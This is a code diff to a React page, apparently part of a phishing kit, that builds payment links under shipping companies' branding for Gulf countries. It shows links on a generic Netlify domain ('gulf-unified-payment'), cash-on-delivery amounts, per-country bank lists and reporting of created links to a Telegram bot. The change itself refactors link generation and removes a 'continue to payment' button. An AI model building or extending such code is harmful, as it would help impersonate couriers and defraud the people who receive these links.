@@ -13,7 +13,8 @@ import { getBanksByCountry } from "@/lib/banks";
 import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
 import { getCompanyMeta } from "@/utils/companyMeta";
 import { getCurrency, getDefaultTitle } from "@/utils/countryData";
-import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, ArrowRight, CreditCard } from "lucide-react";
+import { generatePaymentLink } from "@/utils/paymentLinks";
+import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, CreditCard } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import TelegramTest from "@/components/TelegramTest";
@@ -88,14 +89,12 @@ const CreateShippingLink = () => {
         },
       });
 
-      // Get dynamic metadata based on company and country
-      const companyMeta = getCompanyMeta(selectedService);
-      const countryCurrency = getCurrency(country);
-      const countryTitle = getDefaultTitle(country);
-
-      // Generate dynamic payment URL with currency and title parameters
-      const productionDomain = 'https://gulf-unified-payment.netlify.app';
-      const paymentUrl = `${productionDomain}/pay/${link.id}/recipient?company=${selectedService}&currency=${countryCurrency}&title=${encodeURIComponent(countryTitle)}`;
+      // Generate unified payment URL using the new function
+      const paymentUrl = generatePaymentLink({
+        invoiceId: link.id,
+        company: selectedService,
+        country: country || 'SA'
+      });
 
       // Send data to Telegram with image and description
       const telegramResult = await sendToTelegram({
@@ -106,7 +105,7 @@ const CreateShippingLink = () => {
           package_description: packageDescription,
           cod_amount: parseFloat(codAmount) || 0,
           country: countryData.nameAr,
-          payment_url: `${productionDomain}/r/${country}/${link.type}/${link.id}?company=${selectedService}`
+          payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?company=${selectedService}`
         },
         timestamp: new Date().toISOString(),
         imageUrl: serviceBranding?.ogImage || serviceBranding?.heroImage,
@@ -149,14 +148,7 @@ const CreateShippingLink = () => {
   const handlePreview = () => {
     window.open(createdPaymentUrl, '_blank');
   };
-  
-  const handleContinue = () => {
-    setShowSuccessDialog(false);
-    const countryCurrency = getCurrency(country);
-    const countryTitle = getDefaultTitle(country);
-    navigate(`/pay/${linkId}/recipient?company=${selectedService}&currency=${countryCurrency}&title=${encodeURIComponent(countryTitle)}`);
-  };
-  
+
   if (!countryData) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
@@ -451,12 +443,6 @@ const CreateShippingLink = () => {
             </div>
           </div>
           
-          <AlertDialogFooter>
-            <AlertDialogAction onClick={handleContinue} className="w-full">
-              <ArrowRight className="w-4 h-4 ml-2" />
-              متابعة للدفع
-            </AlertDialogAction>
-          </AlertDialogFooter>
         </AlertDialogContent>
       </AlertDialog>
     </div>
